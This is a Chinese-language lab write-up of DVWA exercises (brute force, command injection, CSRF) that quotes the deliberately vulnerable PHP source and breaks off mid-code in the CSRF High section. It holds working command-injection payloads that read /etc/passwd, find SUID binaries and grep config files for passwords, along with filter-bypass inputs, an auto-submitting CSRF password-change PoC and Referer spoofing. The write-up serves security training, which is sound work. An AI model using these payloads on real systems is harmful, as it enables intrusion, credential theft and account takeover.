---
title: "DVWA全难度"
date: 2026-01-16
draft: false
weight: 1
---

## 连通性测试
1. kali ping靶机ip和路由ip都可以通
2. 流程：kali 想ping靶机ip`192.168.242.100`，kali发现目标地址不属于`192.168.203.0/24`这个网段，于是把包发给默认网关`192.168.203.2`，VMware的NAT服务收到包后，将其交给宿主机的网络栈，宿主机发现本地有LingJing维护的虚拟网桥连接着`192.168.242.0`网段，于是将包送达靶机
```shell
┌──(kali㉿kali)-[~]
└─$ ip route                                              
default via 192.168.203.2 dev eth0 proto dhcp src 192.168.203.129 metric 100 
192.168.203.0/24 dev eth0 proto kernel scope link src 192.168.203.129 metric 100 

┌──(kali㉿kali)-[~]
└─$ route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.203.2   0.0.0.0         UG    100    0        0 eth0
192.168.203.0   0.0.0.0         255.255.255.0   U     100    0        0 eth0
```
3. `192.168.203.2`是什么？首先kali的IP是`192.168.203.129`，`192.168.203.1`是宿主机的虚拟网卡（VMnet8网卡），这是宿主机在虚拟网络里的“分身”，用于宿主机和虚拟机直接通信；`192.168.203.2`是虚拟网关，集成了NAT转发和DNS服务的虚拟节点，虚拟机要上网和访问其他网段，必须经过他

## Brute Force（low）
### 源代码
```PHP
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Get username
    $user = $_GET[ 'username' ];

    // Get password
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```
- 获取并处理输入
  - `$user/pass = $_GET[ 'username/password' ];`直接从`$_GET`中获取用户名和密码，未进行任何过滤
  - `$pass = md5( $pass );`密码在查询前被转为MD5哈希，容易被彩虹表破解。
- 数据库查询
  - `$query`，变量`$user`直接拼接到SQL语句中，有SQL注入漏洞
- 逻辑验证
  - `if (){//登录成功} else{登录失败}`，只要数据库存在匹配的一行记录，登录就成功，这种非黑即白的反馈，让自动化工具能通过返回页面的长度or内容，判断是否爆破成功
### 1.环境配置
浏览器配置，设置代理指向Burp Suite的127.0.0.1:8080，但是宿主机中配置好后，在宿主机中点击Login，却是无法访问，且虚拟机中没有捕获到。
这是由于Burp Suite 默认仅监听 127.0.0.1（回环地址），宿主机浏览器发送的请求属于外部流量，会被Burp拒之门外。
解决思路一：使用虚拟机中的firefox浏览器（方便，用这个）
解决思路二：Burp Suite中的Proxy设置添加一个All interfaces，端口8080，然后在宿主机代理ip中输入虚拟机ip地址以及8080端口（麻烦不用）

### 2.burp suite使用
1. 截取收到的信息，转移到intruder里
2. 点击**clear§**，清空所有默认标记，接着选取用户名和密码，点击**Add§**,告诉电脑要破解的值
3. 选择Cluster bomb（交叉组合），会尝试字典A和B的所有排列组合
4. 查看字典：`cd /usr/share/wordlists/`,`ls -l`
5. 解压`rockyou.txt/gz`,`sudo gunzip /usr/share/wordlists/rockyou.txt.gz`(实则这一步没用，因为用不着rockyou这个字典，它太过庞大)
4. Payload position1中载入
5. 这里对于用户名直接用admin
6. 密码挑选一个字典库fast
7. 结果发现admin，密码是password的长度为4741非常不同，为密码，破解成功

## Brute Force（medium）
### 源代码
```PHP
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( 2 );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
- 引入`sleep(2)`，当登录失败，程序暂停2s
- `mysqli_real_escape_string`,对用户输入的特殊字符进行转义，在low难度下可以输入`admin' #`直接绕过密码，但是medium难度下，输入会被转义未`admin\' #'`，失去SQL语法效力
## Brute Force（High）
### 源代码
```PHP
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
- `checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );`，验证Token，这里的
### 1.前置知识
- brute force四种攻击模式：
Sinper（狙击手），使用一个字典，将标记的数据逐个遍历
Battering ram（攻城槌），使用一个字典，将包内所有标记的数据进行同时替换再发出
Pitchfork（干草叉），对每个标记字段单独设置字典，按照一一对应的关系取最少的组合
Cluster bomb（集束炸弹），使用穷举法，对每个标记字段都遍历字典
### 2.侦测
抓包后，有token限制，因此攻击时要设置token
`user_token=ac0f0d11cecc919cccfd42fde46f5c7e`
### 3.burp suite使用
- 采用Pitchfork attack
- 选中用户名、密码、token
- setting - Grep-Extract(检索提取) - 重新获取响应
字段从`name = 'user_token' value='`到`'`，让burp在每一次尝试中，自动去HTML源码里寻找下一次请求用的token
- setting - Redirections（重定向） - Always
- ！！！setting - Attack results - 关闭Make unmodified baseline request（生成未修改的基本请求）（**实际上不用关闭，不知道为什么！！！**）
- resource pool - create new resource pool - maximum concurrent requests: 1（最大开发请求数）
由于token是线性的，假设同时发送10个请求，这10个请求拿到的可能都是同一个旧token，导致其中9个立刻失败，必须一个个来
- 刷新dvwa网页，并找到token如下：
```html
<input type="hidden" name="user_token" value="ac0f0d11cecc919cccfd42fde46f5c7e">
```
- 用户名和密码采用cluster bomb attack
-  payloads - token payloads设置采用Recursive grep（递归搜索）
普通的payload是从字典里读，但token payload必须从上一次请求的结果里“接过结果”，用请求1拿到的token发起请求2，再用请求2拿到的token发起请求3
- 双击最后破解出的结果，接着Response - Render 查看将HTML代码模拟渲染成类似浏览器的页面
## command injection（low）
### 1.前置知识
1. 靶机IP：`192.168.242.xxx`是DVWA靶机真实的内网地址，渗透测试的直接对象
2. 路由IP：`192.168.188.188`是LingJing虚拟网络的路由器/网关地址，负责连接Kali和靶机，所有的攻击流量经过这个虚拟路由转发给靶机，LingJing可以用这个地址来监控打靶流量、控制网络隔离
3. 桥接模式和NAT模式区别：桥接模式（一台独立的电脑），虚拟机的网卡通过物理网卡桥接到真实路由器上，而NAT模式（宿主机的手机热点），宿主机充当路由器的角色，为虚拟机提供了一个内部的小网络
4. kaliIP：`192.168.203.129`
5. 管道符：
| 上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）
6. 连接符
; 顺序连接（前面的执行完执行后面的）
& 后台运行（A放到后台，立即开始执行B）
&& 逻辑与（A成功了，才执行B）
|| 逻辑或（当前面执行出错（为假）时，执行后面的方案）
7. php源代码：
```PHP
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 
```
- 总体思路：用户输入 - `target` - 拼接字符串 - `shell_exec()` - 返回结果
- `$_POST[ 'Submit' ]`：首先`$_POST`是一个PHP数组，挡在网页表单点击提交，且表单设置了`method="post"`时，所有输入框的数据都会存放在这个数组里
- `[ 'Submit' ]`是数组的键名，对应HTML代码中按钮的`name`属性，对应的HTML代码为`<input type="submit" name="Submit" value="Submit">`
- `if( isset( $_POST[ 'Submit' ]  ) )`，其中`isset()`是一个判断函数检查括号里的变量是否存在，因此这句话意思是**如果用户点击了Submit按钮，才执行后面的代码**
- 这里没用`$_GET`，是因为如果用了，数据会显示在URL栏，例如：`?ip=127.0.0.1&Submit=Submit`，通常用于搜索或翻页，而使用`$_POST`数据包含在HTTP请求体中，不会显示在URL里
- ` $target = $_REQUEST[ 'ip' ];`是获取用户在网页输入框中填写的IP地址，并把它存入一个名为`$target`的变量中，`$_REQUEST`是PHP的超级（全局变量）数组，GET方法和POST方法提交的数据都能接收，`[ 'ip' ]`对应在HTML表单中输入框的名称，**这一行是漏洞根源**，它直接把用户输入的字符串拿来用
- `if( stristr( php_uname( 's' ), 'Windows NT' ) )`判断当前服务器的操作系统是不是Windows,`php_uname( 's' )`返回操作系统名称如：Linux，FreeBSD，Windows NT，`strister(字符串, 搜索词)`：在字符串里找特定的词（不区分大小写），如果是，执行Windows格式的ping命令，如果不是执行Linux格式的命令，必须加`-c 4`限制次数，不然无限ping导致网页卡死。
- `$cmd = shell_exec( 'ping  ' . $target )`，`shell_exec()`是php的一个内置函数，打开系统终端，并将括号里的字符串当作命令直接运行，会把命令执行后屏幕上显示的所有文字返回，存入变量`$cmd`中，`.`PHP中，点号用于连接两个字符串，将固定的文字`ping`和用户输入的变量`$target`强行拼接在一起
- `echo "<pre>{$cmd}</pre>";`则是将命令执行的原始结果，原封不动地展示，`echo`是PHP的输出指令，负责把文字发送给浏览器显示，`<pre>`是一个HTML标签，会保留文本中的空格和换行，`{$cmd}`是变量插值。PHP会把变量`$cmd`里存储的执行结果直接填充到这里，这里执行了恶意命令，还通过`echo`和`<pre>`把命令执行后的结果呈现在黑客的屏幕上

### 2.注入payload侦测
- `127.0.0.1 && whoami` 
www-data：当前权限是web服务权限，而非系统管理员root，只能访问web目录（`var/www/html`）和一些公共目录（`/tmp`），无法读取`/root`或修改系统关键配置，下一步思路是读取数据库配置文件（如`config.inc.php`）获取数据库密码，尝试提升到`root`权限
- `127.0.0.1 ; ls` or `127.0.0.1 && dir`
help：存放该挑战的帮助文档
index.php：正在访问的“命令注入”页面的主代码文件，负责接收输入并调用系统命令
source：存放漏洞不同等级（low，medium，high，impossible）后端PHP源码的地方
确定了当前路径是`/var/www/html/vulnerailities/exec/`
可以通过命令直接读取后端
- `127.0.0.1 && ip addr`
`lo`（loopback环回接口）状态是unknown，ip地址分别`127.0.0.1`（ipv4），`::1`（ipv6）
`eth0@if5`（以太网接口）状态是`UP`，特征是`@if5`（说明是虚拟网络接口，常见于docker容器或虚拟化环境），mac地址是`82:4a:e5:b8:d0:96`，ip地址`172.17.0.2`（属于私有局域网地址，通常是docker默认网段），掩码为`/16`（255.255.0.0）
```shell
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if5:  mtu 1500 qdisc noqueue state UP group default 
    link/ether 82:4a:e5:b8:d0:96 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```
### 3.进一步思路（提升权限失败）
**综合上述信息**，接下俩目标是1.探索其他目录，读取敏感源码2.提升权限
### 4.确定权限和系统版本
`127.0.0.1; ls help`
`127.0.0.1; cat help/help.php`
`127.0.0.1； ls -R`
`127.0.0.1; whoami; id`
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
`127.0.0.1; uname -a`内核版本
Linux b1abb9752b2c 6.12.17-0-virt #1-Alpine SMP PREEMPT_DYNAMIC 2025-02-27 18:31:59 x86_64 GNU/Linux
`127.0.0.1; cat /etc/issue`发行版信息
Debian GNU/Linux 9 \n \l
### 5.寻找SUID特权文件
`127.0.0.1; find / -perm -u=s -type f 2>/dev/null`（`find /`使用`find`工具从根目录开始搜索，`-perm`表示按权限查找，`-u=s`表示查找设置了SUID位的文件，`-type f`限定只查找普通文件，排除目录或设备文件，`2>dev/null`将报错信息丢弃，只在屏幕上显示你有权查看的结果，保持输出整洁）,SUID 允许普通用户以文件所有者（通常是 root）的权限执行该文件，**假如**找到了如`find`、`vim`、`nano`、`cp`、`bash`这样的程序，那么可以用程序自带的功能来读写root文件或直接获取root shell。
```
/bin/mount
/bin/ping
/bin/su
/bin/umount
/bin/ping6
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
```
### 6.检查Sudo配置
`127.0.0.1; sudo -l`查看当前用户是否可以免密执行某些sudo命令
但结果并未显示
### 7.查找敏感文件
`127.0.0.1; cat /etc/passwd`读取密码文件
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```
`127.0.0.1; cat /etc/shadow`读取影子文件
结果无
`127.0.0.1; grep -i "password" /var/www/html/config/*`搜索配置文件中的明文密码
```
/var/www/html/config/config.inc.php:$_DVWA[ 'db_password' ] = 'vulnerables';
/var/www/html/config/config.inc.php.bak:$_DVWA[ 'db_password' ] = 'vulnerables';
/var/www/html/config/config.inc.php.dist:$_DVWA[ 'db_password' ] = 'p@ssw0rd';
```
### 8.反弹shell（失败）

## command injection(medium)
1. 源代码：
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```
- 黑名单数组(`substitutions`)，将`&&`、`;`删掉
- `array_keys( $substitutions )`是定义的数组中提取所有的“键名”，为`['&&', ';']`
- `$substitutions`是完整的关联数组，对应的键值为`''`（空字符串）
- `$target`是用户输入的ip地址字符串
- `str_replace`，执行批量搜索与替换的操作，根据`&&`和`;`去用户输入的字符串里搜索，替换为空
- 弱点：若输入`127.0.0.1 & whoami`，则绕过了限制

## command injection(High)
1. 源代码
```PHP
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```
- 新增`trim()`函数，移除字符串开头和结尾的空白字符（空格、换行），防止攻击者在命令行前后加空格干扰字符串匹配
- 扩大了`$substitutions`黑名单，``$ ( ) ` ``移除这四个，防御命令替换漏洞（防止攻击者在命令中嵌套执行另一条命令），移除`-`，防止攻击者添加额外的命令参数
- 漏洞：``'| ' => ''``这里管道符后面多了一个空格

## command injection(Impossible)
1. 源代码：
```PHP
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target );

    // Split the IP into 4 octects
    $octet = explode( ".", $target );

    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // Ops. Let the user name theres a mistake
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
- `$octet = explode( ".", $target );`将输入按点号拆分成数组（如`127.0.0.1`拆为`127`,`0`,`0`,`1`）
- `is_numeric()`检查拆分后的每一个部分是否全是数字
- `sizeof( $octet ) == 4`确保拆分后刚好只有4段
- 以上内容导致，若输入`127.0.0.1; whoami`，拆分出的第五部分or非数字部分导致验证失败，进入`ERROR`
- `$target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];`服务器用经过数字验证的片段，重组出一个新的`target`，确保了最终进入`shell_exec`的字符串里，绝不可能含有用户夹带的`; & |`特殊字符
- `checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); `这里要求每一个请求必须携带一个随机生成的Token，意味着攻击者无法通过CSRF（跨站请求伪造）攻击
- 定义了什么是**合法**的，而不是试图**过滤黑名单**，这是**正确安全编码**

## CSRF(low)
### 源码分析
```PHP
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
- `if( isset( $_GET[ 'Change' ] ) )`代码通过`$_GET`获取参数，意味着修改密码的所有数据都直接暴露在URL中
- `if( $pass_new == $pass_conf )`仅检查两次输入的密码是否一致，一致就认为请求合法
- `$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";`直接更新数据库，通过`dvwaCurrentUser()`获取当前登录的用户，只要用户处于登录状态，浏览器就会自动携带Cookie，服务器看到有效的Cookie就会直接执行更新。
- 缺乏Token验证，缺乏来源检查（HTTP请求头中的`Referer`或`Origin`），缺乏二次确认（没用要求输入旧密码或验证码）
### 侦测
修改密码为111后，URL变为：
`http://192.168.242.23/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#`
### burp suite操作
1. 使用宿主机的burp suite专业版，查看宿主机VMnet8的ip为`192.168.203.1`，则在proxy listeners中添加一个监听`192.168.203.1:8080`的监听器，最后在虚拟机的firefox中手动配置代理HTTP为`192.168.203.1:8080`
2. 截取请求，在Proxy - HTTP history中右键请求，选则Engagement tools - Generate CSRF Poc，弹出窗口中能看到自动生成的HTML代码，Options中勾选Include auto-submit script（受害者只要打开网页，密码就会自动修改，无需点击按钮）
3. 生成Poc代码（Proof of Concept概念验证），旨在证明某个漏洞确实存在，不一定造成破坏，但能直观展示攻击如何发生的。
```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://192.168.242.23/vulnerabilities/csrf/">
      <input type="hidden" name="password&#95;new" value="111" />
      <input type="hidden" name="password&#95;conf" value="111" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
- 隐藏的表单`<form>`
  - `action`目标指向DVWA的密码修改接口
  - `type="hidden"`攻击者将修改后的密码111藏在隐藏域，受害者在浏览器打开此页面时，屏幕上看不到这些输入框
  - `password&#95;new`是HTML实体编码，代表`password_new`，规避某些简单的字符过滤
- 自动提交脚本`<script>`
  - 伪造浏览器历史记录，页面加载后立即提交第一个表单，受害者只要点开链接，浏览器就会立即向DVWA发送修改密码的请求，而不需要受害者去点提交按钮
- 攻击发生的三个前提
  - 受害者已登录：浏览器里有DVWA有效的`PHPSESSID`Cookie
  - 浏览器机制：浏览器向目标服务器发请求时，会带上对应的Cookie
  - 服务器未校验，DVWA的low等级没用检查Token或Referer，无法分辨请求是来自己“真正的修改页面”，还是“恶意Poc页面”

## CSRF(Medium)
### 源码分析
```PHP
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update the database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
- Referer检验：`if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )`其中`$_SERVER['HTTP_REFERER']`标明请求是从哪个页面发起的，`$_SERVER[ 'SERVER_NAME' ]`标明当前服务器的域名或IP地址，检查请求来源页面（Referer）中是否包含服务器的主机名。如果包含，则认为是“内部请求”并允许修改，如果不包含（如黑客搭建的恶意网站），则拒绝。
- 漏洞1：`stripos`函数只要在字符串中找到关键词就会返回真，DVWA服务器ip是`192.168.242.18`，则攻击者可以将PoC文件命名未`csrf_192.168.242.18.html`，当受害者访问，浏览器发送的Referer是`http://攻击者域名/csrf_192.168.242.18.html`，代码检查发现里面有ip，验证通过。
- 漏洞2：若攻击者进行配置，or请求是从HTTPS跳转到HTTP，浏览器可能不发送Referer字段，虽然源码中会导致验证失败，但如果**Referer为空则放行**，也会成为绕过点。
### 侦测
此时再次点击之前的`html`，会发现提示`That request didn't look correct.`
csrf界面输入密码，URL变为`http://192.168.242.18/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#`
但是手动输入URL没用
### burp suite使用
修改好ip后，双击之前的PoC.html文件，进行信息截取，信息如下：
```HTTP
GET /vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change HTTP/1.1
Host: 192.168.242.18
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=idmpljcd3u3j8kef9fsheqpjm6; security=medium
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
这里需要手动添加`Referer`行，`Referer: http://192.168.242.18/vulnerabilities/csrf/`，提示密码修改成功

## CSRF(HIGH)
### 源代码
```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
